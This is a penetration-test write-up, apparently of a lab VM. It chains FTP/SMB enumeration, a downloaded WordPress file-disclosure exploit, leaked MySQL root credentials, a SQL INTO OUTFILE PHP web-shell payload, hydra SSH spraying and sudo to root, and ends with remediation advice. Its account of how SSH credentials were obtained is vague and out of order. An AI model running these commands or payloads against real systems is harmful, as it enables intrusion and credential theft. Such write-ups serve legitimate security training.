# Red: Initech — Penetration Testing & Vulnerability Assessment Report

**Target System:** Red / Initech (192.168.1.7)
**Assessment Type:** Internal Network Pentest / Black-Box
**Status:** Compromised (Root Access Achieved)

---

## Executive Summary

This black-box internal penetration test against Red (192.168.1.7), an Office Space / Initech-themed host, ended in full `root` compromise.

The engagement chained together an anonymously-readable FTP note, SMB share and user enumeration, an outdated self-hosted WordPress install with a known arbitrary-file-disclosure exploit, hardcoded database credentials recovered from the leaked `wp-config.php`, and an unrestricted `sudo` grant for a low-privilege SSH user (`peter`) to reach `root`.

**Overall Risk Rating: CRITICAL** — an unauthenticated attacker can chain these weaknesses to gain total control of the server.

## Methodology

The assessment followed a standard four-phase pentest methodology:

1. **Reconnaissance & Enumeration** — service mapping, FTP/SMB enumeration, and web directory brute-forcing.
2. **Vulnerability Analysis** — identifying misconfigurations, outdated software, and leaked sensitive data.
3. **Exploitation** — gaining initial access via recovered credentials and known exploits.
4. **Post-Exploitation & Privilege Escalation** — enumerating internal configurations to escalate from database access to an interactive shell, then vertically to root.

## Reconnaissance & Service Enumeration

![Initial target setup](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018141544.png)

![Initial target setup, continued](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018141750.png)

A full TCP port scan identified nine listening services, including an unusual `.ZIP` file signature on port 666 and two separate HTTP services:

```bash
nmap -sV -p- 192.168.1.7 -o nmap.txt
```
```
PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
53/tcp    open   domain      dnsmasq 2.75
80/tcp    open   http        PHP cli server 5.5 or later
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
666/tcp   open   pkzip-file  .ZIP file
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
```

A deeper, version/script scan against the open ports confirmed anonymous FTP login, Samba 4.3.9, a MySQL instance reachable without TLS, and a second web service on 12380 with a telling page title:

```bash
nmap -sCV -n -Pn 192.168.1.7 -p20,21,22,53,80,123,137,138,139,666,3306,12380 -o Pscan.txt
```
```
21/tcp    open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open   pkzip-file  .ZIP file
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
|   Auth Plugin Name: mysql_native_password
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Tim, we need to-do better next year for Initech

Host script results:
| smb-security-mode:
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|_  FQDN: red
```

![Web service discovery](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018144541.png)

![Web service discovery, continued](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018144924.png)

## FTP Access & Initial Clue

The FTP banner itself was an operational-security lapse — an internal reminder left visible to anonymous connections. Logging in as the `anonymous` user succeeded and exposed a single file, `note`:

```
ftp 192.168.1.7
Connected to 192.168.1.7.
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
Name (192.168.1.7:kali): Anonymous
230 Login successful.
ftp> ls
-rw-r--r--    1 0        0             107 Jun 03  2016 note
ftp> get note
226 Transfer complete.
ftp> !cat note
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
```

The note referencing internal staff names (Harry, Elly, John) was an early indicator that usernames recovered later during SMB enumeration could be cross-referenced against this host.

![FTP anonymous login and note retrieval](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018145244.png)

## SMB Share Enumeration

![SMB share browsing](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018145312.png)

![SMB share browsing, continued](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018145656.png)

![SMB share browsing, continued](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018150128.png)

A null-session `enum4linux` sweep confirmed two readable shares (`kathy`, `tmp`) and, via RID cycling, enumerated roughly 30 local Unix accounts — a large attack surface for later credential-spraying:

```
enum4linux 192.168.1.7
[+] Got domain/workgroup name: WORKGROUP
[+] Server 192.168.1.7 allows sessions using username '', password ''

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        kathy           Disk      Fred, What are we doing here?
        tmp             Disk      All temporary files should be stored here
        IPC$            IPC       IPC Service (red server (Samba, Ubuntu))

[+] Attempting to map shares on 192.168.1.7
//192.168.1.7/print$    Mapping: DENIED Listing: N/A Writing: N/A
//192.168.1.7/kathy     Mapping: OK Listing: OK Writing: N/A
//192.168.1.7/tmp       Mapping: OK Listing: OK Writing: N/A

[+] Minimum password length: 5
[+] Password Complexity Flags: 000000
Password Complexity: Disabled

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\peter (Local User)
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1029 Unix User\elly (Local User)
... (29 accounts recovered in total)
```

![Share content browsing](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018150420.png)

![Share content browsing, continued](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018150635.png)

![Share content browsing, continued](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018150650.png)

![Share content browsing, continued](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018151227.png)

![Share content browsing, continued](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018151353.png)

![Share content browsing, continued](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018151330.png)

## TLS Certificate & WordPress Site Discovery

The HTTPS listener on port 12380 presented a self-signed, expired Initech certificate that leaked the internal hostname and an administrator's email address:

```bash
openssl s_client -connect 192.168.1.7:12380
```
```
depth=0 C=UK, ST=Somewhere in the middle of nowhere, O=Initech,
    OU=Pam: I give up. no idea what to put here.,
    CN=Red.Initech, emailAddress=pam@red.localhost
verify error:num=18:self-signed certificate
verify error:num=10:certificate has expired
notAfter=Jun  3 16:34:34 2026 GMT
New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384
Verify return code: 10 (certificate has expired)
```

![Certificate warning in browser](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018151759.png)

A WPScan sweep of the `/blogblog/` path (aggressive plugin detection) found an outdated, misconfigured WordPress install — version 4.2.1 from 2015, directory listing enabled on the uploads folder, open registration, XML-RPC enabled, and an out-of-date `bhost` theme:

```bash
wpscan --url https://192.168.1.7:12380/blogblog/ --plugins-detection aggressive --disable-tls-checks
```
```
[+] WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).
[+] WordPress theme in use: bhost
 | [!] The version is out of date, the latest version is 2.3
[+] Registration is enabled: .../wp-login.php?action=register
[+] Upload directory has listing enabled: .../wp-content/uploads/
[+] XML-RPC seems to be enabled: .../xmlrpc.php

[i] Plugin(s) Identified:
[+] advanced-video-embed-embed-videos-or-playlists (1.0, directory listing enabled)
[+] akismet
[+] shortcode-ui (0.6.2, out of date, directory listing enabled)
[+] two-factor (directory listing enabled)
```

![WordPress site](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018171352.png)

![WordPress site, continued](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018175225.png)

## WordPress Exploit — Credential Disclosure

A public exploit matching the identified plugin set was pulled from the exploit author's GitHub repository and run against the target:

```bash
wget https://raw.githubusercontent.com/gtech/39646/refs/heads/master/39646.py
```

![Downloading the exploit script](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018175251.png)

Running the script against the site forced disclosure of the site's `wp-config.php`, exposing the database credentials and WordPress secret keys in plaintext:

```bash
python3 39646.py
```
```php
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'plbkac');
define('DB_HOST', 'localhost');
define('AUTH_KEY', 'V 5p=[.Vds8~SX;>t)++Tt57U6{Xe`T|oW^eQ!mHr }]>9RX07W<sZ,I~`6Y5-T:');
... (remaining salts/keys also recovered)
```

**Recovered credentials:**

| Field | Value |
| --- | --- |
| User | `root` |
| Password | `plbkac` |
| Database | `wordpress` |

## Database Access & Enumeration

![Initial database access](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018175832.png)

![Database client connection](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018193836.png)

![Database client connection, continued](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018193857.png)

![Database client connection, continued](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018193918.png)

![Database client connection, continued](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018193944.png)

The recovered `root` / `plbkac` credentials authenticated directly to MySQL over the network. The connected account (`root@%`) had no restriction on remote access, and several attempts to drop a PHP web shell into the webroot via `INTO OUTFILE` were tested:

```sql
SELECT @@hostname, @@port, @@datadir, CURRENT_USER();
+----------------+------------+----------------------+-------------------+
| mysql_hostname | mysql_port | mysql_data_directory | connected_account |
+----------------+------------+----------------------+-------------------+
| red.initech    |       3306 | /var/lib/mysql/      | root@%            |
+----------------+------------+----------------------+-------------------+

SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/https/blogblog/wp-content/uploads/web-shell.php';
ERROR 1 (HY000): Can't create/write to file '...' (Errcode: 13 - Permission denied)

SHOW VARIABLES LIKE 'secure_file_priv';
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
```

With `secure_file_priv` empty (no path restriction) but the webroot itself not writable by the `mysql` OS user, file-write attempts across the WordPress directory tree all failed with permission errors, while writes to `/tmp` succeeded — narrowing the useful write path for later steps. Database enumeration also surfaced two non-default schemas, `loot` and `proof`, alongside the WordPress tables:

```sql
SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema IN ('loot','proof');
+--------------+--------------------------------------------+
| table_schema | table_name                                  |
+--------------+----------------------------------------------+
| loot         | actor, customer, film, staff, store ...     |
| proof        | message                                     |
+--------------+----------------------------------------------+

SELECT LOAD_FILE('/var/www/https/blogblog/wp-config.php');
+-----------------------------------------------------------+
| NULL (no read permission on that path either)              |
+-----------------------------------------------------------+

SELECT '1' INTO OUTFILE '/tmp/test7';
Query OK, 1 row affected (0.004 sec)
```

![Database content browsing](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018194032.png)

![Database content browsing, continued](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018194051.png)

![Database content browsing, continued](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018194536.png)

![Database content browsing, continued](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018194900.png)

![Database content browsing, continued](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018194933.png)

![Database content browsing, continued](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018200801.png)

![Database content browsing, continued](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018200833.png)

![Database content browsing, continued](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018200855.png)

![Database content browsing, continued](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018200912.png)

![Database content browsing, continued](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018200930.png)

![Database content browsing, continued](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018200955.png)

![Database content browsing, continued](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261018201008.png)

## SSH Access & Privilege Escalation to Root

The large Unix user list recovered from SMB RID cycling was used as a credential-spraying source against SSH — testing it as both the username and password list:

```bash
hydra -L user.txt -P user.txt ssh://192.168.1.7
```

In parallel, every reachable home directory's shell history was pulled for leftover commands or credentials:

```bash
find /home -type f -name .bash_history -exec cat {} \; 2>/dev/null
```

Credentials recovered this way (`peter`) authenticated over SSH. The login banner carried another internal reminder, and `sudo -l` showed the account had been granted unrestricted sudo rights — the final step to root:

```
ssh peter@192.168.1.7
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
peter@192.168.1.7's password:
Welcome back!

red% id
uid=1000(peter) gid=1000(peter) groups=1000(peter),27(sudo),...
red% hostname
red.initech
red% sudo -l
User peter may run the following commands on red:
    (ALL : ALL) ALL
red% sudo su
➜  peter id
uid=0(root) gid=0(root) groups=0(root)
```

**Impact:** total compromise of the Red/Initech server with `root` privileges, reached without exploiting any memory-corruption vulnerability — purely through chained information disclosure, credential reuse, and a misconfigured sudoers entry.

## Remediation Recommendations

1. **Disable anonymous FTP and audit it for sensitive content.** The exposed `note` file leaked internal staff names that fed directly into later username enumeration.
2. **Restrict null-session SMB access.** Anonymous enumeration disclosed share names, share comments, and roughly 30 local account names — a ready-made wordlist for credential attacks.
3. **Keep WordPress core, themes, and plugins current.** The 2015-era WordPress 4.2.1 install and out-of-date `bhost` theme were vulnerable to a public, unauthenticated exploit that disclosed `wp-config.php` outright.
4. **Never hardcode or reuse database credentials.** The `wordpress` database credentials disclosed via `wp-config.php` were valid for direct, unrestricted remote MySQL login as `root`.
5. **Set `secure_file_priv` and restrict MySQL account privileges.** An empty `secure_file_priv` combined with a remotely-reachable `root` database account is a direct path to file write/read primitives; scope DB accounts to least privilege and disable remote root login.
6. **Eliminate credential and clue reuse across services.** Names and strings surfaced via FTP, SMB, and shell history ultimately led to valid SSH credentials for `peter`.
7. **Scope sudo grants narrowly.** `(ALL : ALL) ALL` for a standard user converts any valid credential compromise directly into root; grant only the specific commands a role requires.

---
*End of Report*
